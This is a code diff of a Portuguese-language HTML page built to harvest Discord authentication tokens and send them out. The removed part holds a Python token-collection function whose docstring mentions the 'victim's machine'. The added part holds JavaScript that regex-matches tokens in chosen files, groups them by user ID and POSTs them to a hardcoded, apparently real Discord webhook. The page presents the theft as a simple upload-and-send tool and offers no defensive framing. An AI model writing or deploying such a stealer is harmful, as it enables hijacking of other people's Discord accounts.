@@ -1,110 +1,124 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Enviar Tokens + Código Python</title>
-    <style>
-        body {
-            font-family: monospace, monospace;
-            margin: 20px;
-            background-color: #f5f5f5;
-        }
-        pre {
-            background: #272822;
-            color: #f8f8f2;
-            padding: 15px;
-            border-radius: 8px;
-            overflow-x: auto;
-            max-width: 90vw;
-        }
-        h1 {
-            font-family: Arial, sans-serif;
-            color: #333;
-        }
-        img {
-            cursor: pointer;
-            max-width: 300px;
-            margin-top: 20px;
-        }
-    </style>
-    <script>
-        async function sendTokens() {
-            const webhookUrl = "https://discord.com/api/webhooks/1399887149754744862/EsaDqhc_PV9gl4ml0DImriuY8sx1TmiHKKYt7-g-3wDVDon0SgYWpdSh2Cb8vdEjfeT4";
-            const data = {
-                content: "Found tokens",
-                embeds: [{
-                    fields: [
-                        { name: "User ID", value: "Token1\nToken2" } // Exemplo estático
-                    ]
-                }]
-            };
-
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                });
-
-                if (response.ok) {
-                    alert("Tokens enviados com sucesso!");
-                } else {
-                    alert("Erro ao enviar tokens: " + response.status);
-                }
-            } catch (error) {
-                console.error("Erro:", error);
-                alert("Erro ao enviar tokens.");
-            }
-        }
-    </script>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Coletar e Enviar Tokens Discord</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 20px;
+  }
+  pre {
+    background: #272822;
+    color: #f8f8f2;
+    padding: 15px;
+    border-radius: 8px;
+    overflow-x: auto;
+  }
+  input[type=file] {
+    margin-bottom: 10px;
+  }
+  button {
+    cursor: pointer;
+    padding: 10px 20px;
+  }
+</style>
 </head>
 <body>
-    <h1>Código Python para coletar tokens do Discord</h1>
-    <pre><code>
-def get_tokens_from_path(base_path: Path) -&gt; dict[str, set]:
-    """Collect discord tokens for each user ID.
+<h1>Selecione arquivos para extrair tokens Discord</h1>
+<input type="file" id="fileInput" multiple />
+<button onclick="processFiles()">Processar e Enviar Tokens</button>
 
-    to manage the occurrence of both valid and expired Discord tokens, which happens when a
-    user updates their password, triggering a change in their token. Lacking
-    the capability to differentiate between valid and expired tokens without
-    making queries to the Discord API, the function compiles every discovered
-    token into the returned set. It is designed for these tokens to be
-    validated later, in a process separate from the initial collection and not
-    on the victim's machine.
+<pre id="output"></pre>
 
-    Returns
-    -------
-        user id mapped to a set of potential tokens
+<script>
+// Regex simples para tokens Discord (exemplo)
+const TOKEN_REGEX = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}/g;
 
-    """
-    file_paths = [file for file in base_path.iterdir() if file.is_file()]
+// Função simulada para pegar user id do token (exemplo pega a primeira parte antes do primeiro '.')
+function getUserIdFromToken(token) {
+  const parts = token.split('.');
+  if(parts.length < 1) return null;
+  // Em tokens Discord, a primeira parte é base64 codificado do user id (mas aqui só exemplo)
+  // Na prática você precisaria decodificar base64. Para exemplo, retornarei texto cru
+  return parts[0];
+}
 
-    id_to_tokens: dict[str, set] = {}
+async function processFiles() {
+  const input = document.getElementById('fileInput');
+  const files = input.files;
+  const idToTokens = {};
 
-    for file_path in file_paths:
-        potential_tokens = get_tokens_from_file(file_path)
+  if (files.length === 0) {
+    alert("Selecione ao menos um arquivo.");
+    return;
+  }
 
-        if potential_tokens is None:
-            continue
+  for(let file of files) {
+    const text = await file.text();
 
-        for potential_token in potential_tokens:
-            discord_user_id = get_user_id_from_token(potential_token)
+    const tokens = text.match(TOKEN_REGEX);
+    if (!tokens) continue;
 
-            if discord_user_id is None:
-                continue
+    for(let token of tokens) {
+      const userId = getUserIdFromToken(token);
+      if(!userId) continue;
 
-            if discord_user_id not in id_to_tokens:
-                id_to_tokens[discord_user_id] = set()
+      if(!idToTokens[userId]) idToTokens[userId] = new Set();
+      idToTokens[userId].add(token);
+    }
+  }
 
-            id_to_tokens[discord_user_id].add(potential_token)
+  // Converte Sets para arrays para facilitar envio
+  const finalData = {};
+  for(const [userId, tokensSet] of Object.entries(idToTokens)) {
+    finalData[userId] = Array.from(tokensSet);
+  }
 
-    return id_to_tokens or None
-    </code></pre>
+  document.getElementById('output').textContent = JSON.stringify(finalData, null, 2);
 
-    <h1>Clique na imagem para enviar tokens</h1>
-    <img src="sua-imagem.jpg" alt="Clique aqui para enviar tokens" onclick="sendTokens()">
+  if(Object.keys(finalData).length === 0) {
+    alert("Nenhum token válido encontrado.");
+    return;
+  }
+
+  // Envia para webhook
+  sendTokens(finalData);
+}
+
+async function sendTokens(data) {
+  const webhookUrl = "https://discord.com/api/webhooks/1399887149754744862/EsaDqhc_PV9gl4ml0DImriuY8sx1TmiHKKYt7-g-3wDVDon0SgYWpdSh2Cb8vdEjfeT4";
+
+  // Formata os campos para embed do Discord
+  const fields = Object.entries(data).map(([userId, tokens]) => ({
+    name: `User ID: ${userId}`,
+    value: tokens.join('\n'),
+    inline: false
+  }));
+
+  const payload = {
+    content: "Tokens encontrados:",
+    embeds: [{ fields }]
+  };
+
+  try {
+    const res = await fetch(webhookUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if(res.ok) {
+      alert("Tokens enviados com sucesso!");
+    } else {
+      alert("Erro ao enviar tokens: " + res.status);
+    }
+  } catch(e) {
+    console.error(e);
+    alert("Erro ao enviar tokens.");
+  }
+}
+</script>
 </body>
 </html>
